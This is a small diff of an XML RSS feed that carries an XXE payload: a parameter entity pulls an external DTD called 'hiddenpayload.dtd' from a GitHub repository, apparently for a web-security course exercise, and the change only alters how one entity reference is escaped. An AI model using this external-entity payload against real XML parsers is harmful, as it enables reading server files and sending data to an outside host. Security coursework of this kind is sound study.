@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [ 
 <!ENTITY % load SYSTEM "https://raw.githubusercontent.com/farisjalal/COMP6843/main/hiddenpayload.dtd">%load;
-<!ENTITY test "&fjrq;">
+<!ENTITY test "\&fjrq;">
 ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
